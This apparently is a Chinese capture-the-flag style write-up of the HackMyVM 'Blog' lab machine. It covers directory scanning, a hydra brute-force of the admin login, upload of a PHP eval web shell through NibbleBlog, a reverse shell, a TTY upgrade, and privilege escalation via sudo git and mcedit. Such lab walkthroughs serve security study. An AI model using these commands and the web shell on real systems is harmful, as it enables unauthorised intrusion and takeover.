---
title: "penetration | 02_hackmyvm-easy-Blog"
description: "文件上传，hydra爆破，Git提权，mcedit提权"
date: "2022-03-31T13:40:00.000Z"
updated: "2024-03-01T05:17:33.000Z"
tags: ["penetration"]
draft: false
layout: "post"
slug: "hackmyvm-easy-blog"
---

## HackMyVM | Easy - Blog

## 敬告

**1，本人文章所有内容仅用于个人学习、研究或者欣赏使用，请读者（以下简称“您”）不要从事任何非法行为。**

**2，本人文章中涉及到的转载，摘录等内容均会标明清楚来源，如涉及侵权，请联系本人删除。**

**3，请您支持正版软件，切勿使用盗版软件，非官方网站的网络资源请在试用后24小时内删除。**

**4，本次实践环境来自网上已公开的渗透测试环境虚拟机，一切操作过程涉及到的操作网路皆仅由本人自用路由器搭建而成，不涉及到任何人或组织的利益相关。由因您从事各种违反网络安全法等相关法律法规而产生的任何问题都将由您自行承担。**

## 实践环境

### 攻击机

kali - VirtualBox_amd64 | 192.168.6.188

ubuntu - Desktop_amd64 | 192.168.6.223

Windows 10 | 192.168.6.107

### 靶机

[Blog - Debian 10 from HackMyVM.eu](https://hackmyvm.eu/machines/machine.php?vm=Blog) - 192.168.6.163

## 前期探测

开机

![image-20220330094420024](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330094420024.png)

ip是 **192.168.6.163**

### netdiscover

已经知道靶机的地址 就不用discover了

### nmap

```bash
# 快速扫描靶机服务
nmap -sC -sv -v -p- 192.168.6.163
```

![image-20220330095210521](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330095210521.png)

### 访问

用浏览器打开主页就看到这个了

![image-20220330095425541](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330095425541.png)

### gobuster

```bash
# 目录爆破工具
gobuster dir -u http://192.168.6.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php

gobuster dir -u http://192.168.6.163/my_weblog/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -e -o dir_192.168.6.163 -t 30 -q

## -u 设置目标
## -w 设置字典
## -x 指定后缀
## -e 打印完整的url
## -o 设置完成后保存到哪
## -t 设置线程 默认是20
## -q 安静模式
```

![image-20220330095835453](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330095835453.png)

分别扫出 index.php(刚才看到的) my_weblog server-status(Forbidden)

**my_weblog 页面如下**

![image-20220330100025580](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330100025580.png)

继续使用随便点点发现这个文件夹下有很多东西，于是再用gobuster扫描一次

```
gobuster dir -u http://192.168.6.163/my_weblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php
```


![image-20220330100324187](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330100324187.png)

### hydra

随便点一点 发现一个登录界面

考虑用密码爆破登录

![image-20220330102734743](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330102734743.png)

```
**hydra -l admin -P passwd.txt 192.168.6.163 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect" -t 64 -v -f**
```


那确实漫长

![image-20220330175800380](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330175800380.png)

账号密码是 **admin:kisses**

进管理员后台了

![image-20220330175933517](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330175933517.png)

### expolit-db

还是先去网上找一下有没有可以利用的exp

在页面的右下角可以找到

![image-20220330172911577](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330172911577.png)

Nibbleblig 3.7.2 版本的

![image-20220330173014835](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330173014835.png)

如图 4.0.3 那个已经整合到msfconsole里了

![image-20220330173124852](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330173124852.png)

这是一个文件上传的远程任意代码执行漏洞

问题是需要 username 和 password

就得等上一步爆破出的密码了

![image-20220330180506561](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330180506561.png)

**run**一下

![image-20220330183353503](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330183353503.png)

?

### 直接复现这个漏洞好了

![image-20220330183704935](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330183704935.png)

那就照着这个走一下

发现后台确实有很多可以文件上传的点？

```php
# image.php

<?php @eval($_POST['cmd']);?>
## http://192.168.6.163/my_weblog/content/private/plugins/my_image/image.php?cmd=id
# 这条没有回显

<?php @eval(phpinfo());?>
## http://192.168.6.163/my_weblog/content/private/plugins/my_image/image.php
# 这条有回显了
```

先上传一个 image.php 然后访问一下 **http://192.168.6.163/my_weblog/content/private/plugins/my_image/image.php**

![image-20220330184231746](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330184231746.png)

[那就弄个反弹shell的php马](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

注意相应修改一下反弹的ip和端口 然后在 kali 监听1234端口

![image-20220330205356176](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330205356176.png)

反弹成功

![image-20220330205525738](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330205525738.png)

下一步是提权横向渗透

## 进入物理机

进入 /home 目录看了一下 进入用户的权限都没有

![image-20220330205807714](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330205807714.png)

进入www-data的主目录发现 .bash_history 文件

![image-20220330210400605](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330210400605.png)

sudo -l了一下查看可以执行的权限 还真有新发现

![image-20220330205926052](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220330205926052.png)

### git提权

这里有一个坑要提一下 /bin/bash -i 生成的shell不是完全交互式的

要使用 **python3 -c 'import pty;pty.spawn("/bin/bash")'** 生成交互式shell 才可以在接下来的 git -p 中提权

**sudo -u admin /usr/bin/git -p help config**

![image-20220331121429096](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220331121429096.png)

### mcedit提权

提权到admin权限后

进一步使用 sudo -l 查看相关权限操作

![image-20220331204526578](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220331204526578.png)

mcedit提权 了解

```
```

*mcedit：基于文本的 Unix 文件管理器 mcedit(Midnight Commander的编辑器)*

![image-20220331213026442](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220331213026442.png)

#### 获取完整交互式shell

因为接下来的操作需要终端的配置跟上 包括vim那种也是

首先获取攻击机终端配置信息

```bash
# 列出终端环境变量
echo $TERM
stty -a
```

![image-20220331205751683](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220331205751683.png)

靶机方面

```bash
# 写入终端信息
## 这里注意 图里的 xterm-256color 不是所有靶机的shell都支持 建议是在攻击机上也执行 export TERM=xterm 的操作
export TERM=xterm

# 生成一个 python 交互式shell
python -c 'import pty; pty.spawn("/bin/bash")'

# 按 ctrl + z 挂起这个终端

# 重制 stty ; 并且把后台刚刚挂起的终端调回前台
stty raw -echo;fg

# 这里又回到了靶机的shell 用reset刷新终端的屏幕
reset

# 重新设置环境变量; stty rows xx columns xx 根据刚才拿到的消息填
export TERM=xterm
stty rows 34 columns 99
```

执行完这些操作就能获得一个完整的交互式的shell了

#### 提权

其实我也没用过mcedit

但是这个文本编辑器可以从里面打开一个shell

再加上可以使用root身份执行这个mcedit

权当为了提权了

在获取了上一步实现的 完整shell 以后

**sudo -u root mcedit**

出现一个蓝色的方框

![image-20220331213353223](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220331213353223.png)

点击左上角空白处可以打开一个 **User menu**

选择 **Invoke 'shell'** 双击

就能打开一个内置shell了

![image-20220331213505093](https://tataramoriko-oss.oss-cn-shenzhen.aliyuncs.com/markdown/image-20220331213505093.png)

提权完成。

## 参考链接

1，[Hydra（爆破神器）使用方法](https://www.cnblogs.com/daiorz/p/11803131.html)

2，[使用Hydra爆破表单](https://blog.csdn.net/m0_38092942/article/details/85953063)

3，[【工具】gobuster目录猜解工具](https://blog.csdn.net/a15803617402/article/details/84706564)

4，[NibbleBlog 4.0.3 Shell Upload](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html)

5，[反弹shell脚本收集](https://choge.top/2020/02/23/反弹shell脚本收集/)

6，[php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

7，[git提权方法](https://blog.csdn.net/G_Fu_Q/article/details/116276096)

8，[关于一次python获得完整交互式shell的研究](https://xz.aliyun.com/t/7721)

9，[实现交互式shell的几种方式](https://saucer-man.com/information_security/233.html#cl-3)

10，
